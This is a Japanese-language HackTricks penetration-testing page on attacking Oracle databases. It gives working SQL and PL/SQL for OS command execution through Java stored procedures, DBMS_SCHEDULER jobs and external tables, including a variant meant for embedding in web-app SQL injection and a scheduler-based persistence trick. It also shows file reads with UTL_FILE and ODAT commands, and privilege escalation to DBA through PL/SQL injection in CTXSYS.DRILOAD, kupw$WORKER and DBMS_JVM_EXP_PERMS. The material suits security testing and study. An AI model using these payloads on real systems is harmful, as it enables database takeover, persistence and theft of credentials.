<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>


# RCE: Javaストアドプロシージャ

管理者アカウント情報を持っていると想像してください。この場合、サーバー上でコマンドを実行する非常に一般的な方法は、「java stored」プロシージャを書くことです。これは3つの段階で行われます。まず、'oraexec'というJavaクラスを作成します。これを行うには、「sqlplus」ターミナルに接続し、次のように書きます：
```text
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
public static void execCommand(String command) throws IOException
{
Runtime.getRuntime().exec(command);
}
}
/

```
次に、このクラスのためのPL/SQLラッパーを書きます：
```text
create or replace procedure javacmd(p_command varchar2) as language java name 'oraexec.execCommand(java.lang.String)'; /
```
これで準備は整いました。コマンドを実行するには、次のクエリを送信するだけです:
```text
exec javacmd('command');
```
上記の手順を使用すると、実行されたコマンドの結果を見ることはできませんが、出力をファイルにリダイレクトして読むことができます。読み書きのできるシェルの完全なコードはこちらです：

{% file src="../../.gitbook/assets/raptor\_oraexec.sql" %}

しかし、コマンド出力を処理する\[より洗練されたスクリプト\] \(goo.gl/EuwPRU\)もありますが、サイズが大きいです[こちら](https://oracle-base.com/articles/8i/shell-commands-from-plsql)。

# RCE: Scheduler

次の方法は、Java仮想マシンがない場合に役立ちます。それは、Oracleの組み込みタスクスケジューラである「dbmsscheduler」を使用することです。これを使用するには、「CREATE EXTERNAL JOB」という権限が必要です。以下は、C:ドライブのルートに「0wned」という文字列をテキストファイルに入力するコードサンプルです：
```text
exec DBMS_SCHEDULER.create_program('RDS2008','EXECUTABLE','c:\ WINDOWS\system32\cmd.exe /c echo 0wned &gt;&gt; c:\rds3.txt',0,TRUE);
exec DBMS_SCHEDULER.create_job(job_name =&gt; 'RDS2008JOB',program_name =&gt; 'RDS2008',start_date =&gt; NULL,repeat_interval =&gt; NULL,end_date =&gt; NULL,enabled =&gt; TRUE,auto_drop =&gt; TRUE);
```
これにより、コマンドを実行するためのジョブが作成され、実行されます。そして、別のプロシージャからスケジューラを呼び出すためのオプションがあります - 「SYS.KUPP$PROC.CREATE_MASTER_PROCESS」が私たちにとって主に興味深いのは、複数のサブクエリで構成される、つまりマルチステートメントクエリを埋め込むことができるからです。理論的には、ウェブアプリケーションへのインジェクションがあった場合でも、そのようなクエリを実行することができます。
```text
select SYS.KUPP$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''xxx'',''EXECUTABLE'',''cmd.exe /c echo qqq&gt;&gt;C:/scchh'',0,TRUE); DBMS_SCHEDULER.create_job(job_name=&gt;''jobx'',program_name=&gt;''xxx'',start_date=&gt;NULL,repeat_interval=&gt;NULL,end_date=&gt;NULL,enabled=&gt;TRUE,auto_drop=&gt;TRUE);dbms_lock.sleep(1);dbms_scheduler.drop_program(program_name=&gt;''xxx'');dbms_scheduler.purge_log;') from dual
```
```markdown
スケジューラを使用すると、このジョブを複数回実行し、ある程度の頻度で行うことができます。その結果、たとえ管理者がOSからユーザーを削除しても、定期的にシステムで実行されるこのジョブがユーザーを復活させるため、テストされたシステムに足がかりを得るのに役立ちます。

# RCE: 外部テーブル

OSコマンドの実行を達成するための最後の方法として、外部テーブルの使用について言及したいと思います。この方法は後でサーバーからファイルをダウンロードするのに役立ちます。以下の権限が必要です：

* UTL\_FILE;
* CREATE TABLE;
* ユーザー専用のディレクトリ。

「UTL\_FILE」パッケージへのアクセスは、デフォルトで「CONNECT」ロールを持つすべてのアカウントに提供されていることを覚えておきましょう。ステップワン：以下のクエリで発行されたディレクトリをチェックします：
```
```text
SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN
(SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY')
and privilege='EXECUTE' ORDER BY GRANTEE;

TABLE_NAME
------------------------------
ALICE_DIR
```
ステップ2: 希望のコマンドを含む実行可能なバッチファイルを作成します：
```text
declare
f utl_file.file_type;
s varchar2(200) := 'echo KOKOKO &gt;&gt; C:/pwned';
begin
f := utl_file.fopen('ALICE_DIR','test.bat','W');
utl_file.put_line(f,s);
utl_file.fclose(f);
end;
/
```
ステップ3：外部テーブル「EXTT」を準備します。これはファイルを実行するために必要です：
```text
CREATE TABLE EXTT (line varchar2(256))
ORGANIZATION EXTERNAL
(TYPE oracle_loader
DEFAULT DIRECTORY ALICE_DIR
ACCESS PARAMETERS
( RECORDS DELIMITED BY NEWLINE
FIELDS TERMINATED BY ',')
LOCATION (alice_dir:'test.bat'))
/
```
```markdown
これで、以下のコマンドでバッチファイルを呼び出すだけです:
```
```text
SELECT * from EXTT;
```
ターミナルは、システムがテーブルと呼び出されたファイルを一致させることができないというエラーメッセージを表示し始めますが、この場合、重要ではありません。主な目的は実行可能ファイルを開くことであり、それを達成しました。

‘ODAT.py’ ユーティリティもこの攻撃を実装することができます。ただし、「CREATE ANY DIRECTORY」という権限が必要で、デフォルトではDBAロールにのみ付与されています。なぜなら、任意のディレクトリからではなく、「あなたの」ディレクトリからのみファイルを実行しようとするからです。

# ファイルの読み書き

さて、ファイルの読み書きのタスクに進みましょう。サーバーにファイルを読み書きするだけの場合、Javaプロシージャを使用せずに実行できますが、Javaプロシージャもそのようなタスクを処理できます。ファイルシステムで作業するために必要な機能を備えた ‘UTL_FILE’ パッケージを見てみましょう。良いニュースは、デフォルトで ‘PUBLIC’ ロールを持つすべてのユーザーがアクセスできることです。悪いニュースは、デフォルトでは、このプロシージャはファイルシステム全体にアクセスできないことですが、管理者によって事前に定義されたディレクトリにのみアクセスできます。しかし、「\*」として指定されたディレクトリパラメータを見つけることは珍しくなく、文字通り「すべてにアクセス」という意味です。次のコマンドを使用してこれを確認できます：
```text
select name, value from v$parameter where name = 'utl_file_dir';
With appropriate rights, you can expand the access by using the following query:
alter system set utl_file_dir='*' scope =spfile;
```
Alexander Polyakovが提案する`UTL_FILE`パッケージを使用するための最短手順は次のとおりです：
```text
SET SERVEROUTPUT ON
declare
f utl_file.file_type;
sBuffer Varchar(8000);
begin
f:=UTL_FILE.FOPEN (''C:/’,'boot.ini','r');
loop
UTL_FILE.GET_LINE (f,sBuffer);
DBMS_OUTPUT.PUT_LINE(sBuffer);
end loop;
EXCEPTION
when no_data_found then
UTL_FILE.FCLOSE(f);
end;
/

```
```markdown
もし書き込み機能が必要であれば、'raptor_oraexec.sql' というスクリプトをGoogleで検索することをお勧めします。そして、伝統に従って、ここに「ODAT」ユーティリティを使用するオプションを紹介します。これはいつものように最短です：
```
```text
./odat.py utlfile -s <IP> -d <SID> -U <username> -P <password> --getFile "C:/test" token.txt token.txt
```
```markdown
`UTL_FILE`パッケージも非常に興味深いです。運が良ければ、ログや設定ファイルにアクセスし、`SYS`のような特権アカウントのパスワードを取得することができます。

次に紹介したい方法は、再び`External Tables`を使用することです。`External Tables`を使用するとき、データベースは外部テーブルのデータに対して読み取りモードでアクセスできることを覚えておいてください。ハッカーにとって、これはサーバーからファイルをダウンロードする別の機会を意味しますが、この方法には`CREATE ANY DIRECTORY`権限が必要です。すぐに`ODAT`を使用することをお勧めします。それは安定しており、速いです：
```
```text
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile "C:/test" "my4.txt" "my"
```
# 権限の昇格

権限を昇格させるためには、クラシックなバッファオーバーフローやDLLパッチングから、PL/SQLインジェクションのようなデータベースに特化した攻撃まで、様々な方法があります。このトピックは非常に広範囲にわたり、この記事では詳しく取り上げません。これについては、\[Lichfield\] \(goo.gl/IebQN4\) や \[Finnigan\] \(goo.gl/vXhttf\) のブログにあるような大規模な研究論文で議論されています。ここでは、一般的なアイデアを持ってもらうためにいくつかを示します。テスト中は、現在の権限に注意を払い、それに基づいてインターネットで望ましい抜け穴を探すことをお勧めします。

MS SQLとは異なり、攻撃者が「SELECT」の直後に「xp\_cmdshell」を注入できるのは、単に引用符で閉じるだけですが、Oracle DBはこのようなトリックを断固として拒否します。そのため、毎回クラシックなSQLインジェクションに頼ることはできませんが、この場合でも解決策を見つけることが可能です。PL/SQLインジェクションについて考えてみましょう。これは、利用可能な入力パラメータにランダムなコマンドを埋め込むことで、手続き（関数、トリガー、その他のオブジェクト）の実行プロセスを変更するものです。\(с\) Sh2kerr

ペイロードを埋め込むためには、入力パラメータがフィルタリングされていない関数を見つけます。Oracle SQLはマルチステートメント（複数の）クエリを許可していないため、おそらくこの機能を持ついくつかの「特別な」手続きを使用する必要があるでしょう。攻撃の背後にある主な考え方は次のとおりです。特に指定されていない限り、手続きは所有者に代わって実行され、それを開始したユーザーに代わって実行されるわけではありません。言い換えれば、「SYS」アカウントによって所有されている手続きが実行可能であり、そこにコードを埋め込むことができれば、あなたのペイロードも「SYS」アカウントのコンテキストで実行されます。すでに述べたように、これは常に起こるわけではありません。なぜなら、「authid current\_user」というパラメータを持つ手続きがあり、この手続きは現在のユーザーの権限で実行されるからです。しかし、通常、各バージョンでPL/ SQLインジェクションに対して脆弱ないくつかの関数を見つけることができます。このプロセスの一般的なビューを図2に示します。

[![inject](https://hackmag.com/wp-content/uploads/2015/04/inject.png)](https://hackmag.com/wp-content/uploads/2015/04/inject.png)

簡単に言うと、期待される正当な引数の代わりに、手続きの一部となる悪意のあるコードを渡します。「CTXSYS.DRILOAD」関数は、「CTXSYS」に代わって実行され、入力パラメータがフィルタリングされていないため、簡単にDBAまで昇格することができます。
```text
exec ctxsys.driload.validate_stmt('grant dba to scott');
```
ただし、この脆弱性は2004年に発見されたもので、古いバージョン8〜9にのみ影響を与えるため、今となってはおそらく歴史の一部でしょう。通常、権限の昇格プロセスは、権限を増加させる手続きを書くことと、実際のインジェクションを行うことの二つの部分に分けられます。典型的な手順は以下の通りです：
```text
CREATE OR REPLACE FUNCTION F1
RETURN NUMBER AUTHID CURRENT_USER
IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
COMMIT;RETURN(1);END;
/
```
次に、脆弱な関数の引数としてプロシージャを注入することができます（バージョン10xの例）：
```text
exec sys.kupw$WORKER.main('x','YY'' and 1=test1.f1 –-');
```
最近ではないバージョン10および11には、「DBA権限」を持たなくてもサーバー上でコマンドを実行できる「素敵な」例外、または脆弱性があります。`DBMS_JVM_EXP_PERMS`プロシージャは、「CREATE SESSION」権限を持つユーザーに「JAVA IO」権限を与えることができます。攻撃は以下のように実行できます：
```text
SQL&gt; DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT
'GRANT','GREMLIN','SYS','java.io.FilePermission','&lt;FILES&gt;&gt;','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/

PL/SQL procedure successfully completed.
```
プリビレッジを持ってJavaプロシージャを呼び出せるようになったので、Windowsインタープリタから応答を引き出し、何かを実行することができます：
```text
SQL&gt; select dbms_java.runjava(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c echo 123 &gt;c:\\hack’)from dual;
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
